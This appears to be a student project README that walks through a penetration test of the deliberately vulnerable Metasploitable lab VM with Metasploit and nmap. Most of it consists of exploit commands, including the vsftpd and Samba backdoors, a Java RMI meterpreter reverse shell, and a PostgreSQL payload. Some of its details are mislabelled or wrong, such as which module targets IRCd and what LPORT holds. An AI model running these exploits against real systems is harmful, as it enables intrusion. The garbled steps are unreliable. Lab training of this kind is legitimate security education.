# VAPT Project Using Metasploit

## Table of Contents
1. [Introduction](#introduction)
2. [Setup](#setup)
3. [Vulnerabilities Found](#vulnerabilities-found)
4. [Metasploit Usage](#metasploit-usage)
5. [DVWA Vulnerabilities](#dvwa-vulnerabilities)
6. [Conclusion](#conclusion)
7. [References](#references)

## Introduction
This project involves conducting a Vulnerability Assessment and Penetration Testing (VAPT) using Metasploit on a Kali Linux machine targeting a Metasploitable machine. The objective is to identify and exploit known vulnerabilities in the Metasploitable environment.

## Setup

### Prerequisites
- Kali Linux installed on your machine.
- Metasploitable VM configured and running on the same network.

### Steps
1. Download and install [Kali Linux](https://www.kali.org/get-kali/).
2. Download and configure [Metasploitable](https://sourceforge.net/projects/metasploitable/).
3. Ensure both VMs are on the same network.

## Vulnerabilities Found
The following vulnerabilities were identified on the Metasploitable machine:
1. **distcc**
2. **FTP**
3. **SMTP**
4. **Telnet**
5. **Samba**
6. **SSH**
7. **VNC**
8. **Netcat Backdoor**
9. **IRCd**
10. **Java Backdoor**
11. **PostgreSQL**

## Metasploit Usage
You can access Metasploit framwork by the below command
```sh
msfconsole
````
For all attacks make sure LPORT (your kali machine ip) is defined if not available by default. Use this while executing an exploit, auxiliary or scanner module:
```sh
set LPORT <your_ip>
```

### Scanning for Open Ports
Start by scanning the Metasploitable machine for open ports:
```sh
nmap -A -T4 <metasploitable-ip>
```
### Exploiting Distcc
A distributed C/C++ compiler often found with remote code execution vulnerabilities due to misconfiguration.
```sh
msfconsole
use exploit/unix/misc/distcc_exec
set RHOST <metasploitable-ip>
run
```
### Exploiting File Transfer Protocol (FTP)
An insecure file transfer protocol that can be exploited for anonymous login or unencrypted credential interception.
```sh
msfconsole
use unix/ftp/vsftpd_234_backdoor
set RHOSTS <metasploitable-ip>
run
```
Another method, to  connect to the FTP server and use :) to activate the vsftpd backdoor and gain access using pot 6200
```sh
ftp <metasploitable_ip>
nmap -p <metasploitable_ip>
nc <metasploitable_ip> 6200
```
### Exploiting Simple Mail Transfer Protocol (SMTP)
A mail transfer protocol that may expose vulnerabilities like open relay configurations, leading to spam and other exploits.
```sh
msfconsole
use auxiliary/scanner/smtp/smtp_version
set RHOSTS <metasploitable-ip>
run
```
### Exploiting Telnet
An unencrypted remote login service that can easily be intercepted and exploited for credential theft.
```sh
msfconsole
use auxiliary/scanner/telnet/telnet_version
set RHOSTS <metasploitable-ip>
run
```

Another way to exploit telnet is to check if the telnet port is open. If yes, you can directly connect using below command:
```sh
telnet <metasploitable_ip>
```

### Exploiting Samba
A file-sharing service that can be exploited to gain unauthorized access to shared files and directories.
```sh
msfconsole
use exploit/multi/samba/usermap_script
set RHOST <metasploitable-ip>
set SMBSHARE tmp
run
```

Another method to exploit can be done by connecting to the samba client using the following commands if smb port is open:
```sh
smbclient -L //<metasploitable_ip> #Give your kali password for workgroup password to gain anonymous login to metasploitable machine
smbclient -U "" <metasploitable_ip> #The metasploitable smb can be accessed now
```

### Exploiting SSH:
A secure shell service that may have vulnerabilities if weak passwords or outdated versions are used. Using the below command, we can brutefore to find the password and gain unauthorized access.
```sh
msfconsole
use auxiliary/scanner/ssh/ssh_version
set RHOSTS <metasploitable-ip>
run
```

### Exploiting VNC:
A remote desktop service can be compromised if configured without authentication or with weak credentials.
```sh
msfconsole
use auxiliary/scanner/vnc/vnc_none_auth
set RHOSTS <metasploitable-ip>
run
```

### Exploiting Netcat backdoor:
A versatile networking tool that can be used maliciously to establish a backdoor for unauthorized access.
```sh
nc -nv <metasploitable-ip> 6200
```

### Exploiting IRCd:
An internet relay chat daemon that might be vulnerable to remote code execution and unauthorized access.
```sh
msfconsole
use exploit/multi/http/php_cgi_arg_injection
set RHOST <metasploitable-ip>
run
```

### Exploiting Java Backdoor
A vulnerability in Java applications that allows attackers to execute arbitrary code remotely.
```sh
msfconsole
use exploit/multi/misc/java_rmi_server
set payload java/meterpreter/reverse_tcp
set RHOST <metasploitable-ip>
run
```

### Exploiting PostgreSQL:
```sh
msfconsole
use exploit/linux/postgres/postgres_payload
set RHOSTS <metasploitable-ip>
set LHOSTS <your_machine_ip>
run
```


